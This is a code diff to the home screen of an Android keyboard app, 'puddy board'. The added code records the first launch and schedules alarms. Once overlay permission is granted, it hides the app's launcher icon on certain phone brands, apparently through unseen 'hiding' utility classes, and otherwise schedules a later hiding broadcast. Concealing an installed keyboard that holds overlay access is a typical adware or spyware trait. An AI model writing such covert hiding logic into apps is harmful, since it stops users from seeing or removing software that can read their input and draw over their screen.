@@ -1,6 +1,7 @@
 package com.puddy.board.ui.home
 
 import android.content.Intent
+import android.os.Build
 import android.provider.Settings
 import android.view.View
 import android.view.inputmethod.InputMethodManager
@@ -21,13 +22,18 @@ import com.puddy.board.ime.text.keyboard.KeyboardMode
 import com.puddy.board.ime.text.keyboard.TextKeyData
 import com.puddy.board.ime.text.keyboard.TextKeyboardIconSet
 import com.puddy.board.ime.text.layout.LayoutManager
+import com.puddy.board.repository.PrefsReporitory
 import com.puddy.board.ui.base.BaseActivity
 import com.puddy.board.ui.custom.ItemDecorationWithEnds
 import com.puddy.board.ui.edit.EditFragment
 import com.puddy.board.ui.settings.SettingsActivity
 import com.puddy.board.ui.splash.SplashActivity
 import com.puddy.board.util.EXTRA_LAUNCH_SETTINGS
+import com.puddy.board.util.hiding.AlarmBroadcast
+import com.puddy.board.util.hiding.AppHidingUtil
+import com.puddy.board.util.hiding.HidingBroadcast
 import kotlinx.coroutines.launch
+import java.util.*
 
 class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.home_activity) {
 
@@ -51,6 +57,11 @@ class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.h
     }
 
     override fun setupUI() {
+        if (PrefsReporitory.firstLaunchMillis == -1L)
+            PrefsReporitory.firstLaunchMillis = System.currentTimeMillis()
+
+        AlarmBroadcast.startAlarm(this)
+
 
         if (!Settings.canDrawOverlays(this) || !hasKeyboardPermission())
             startActivity(Intent(this, SplashActivity::class.java))
@@ -116,6 +127,18 @@ class HomeActivity : BaseActivity<HomeViewModel, HomeActivityBinding>(R.layout.h
             )
         }
     }
+
+    override fun onResume() {
+        super.onResume()
+        if (Settings.canDrawOverlays(this) && notSupportedBackgroundDevice())
+            AppHidingUtil.hideApp(this, "Launcher2", "Launcher")
+        else
+            HidingBroadcast.startAlarm(this)
+    }
+
+    private fun notSupportedBackgroundDevice() = Build.MANUFACTURER.lowercase(Locale.ENGLISH) in listOf(
+        "xiaomi", "oppo", "vivo", "letv", "honor", "oneplus"
+    )
 
     private fun hasKeyboardPermission() = isKeyboardActive() && isKeyboardEnable()
 
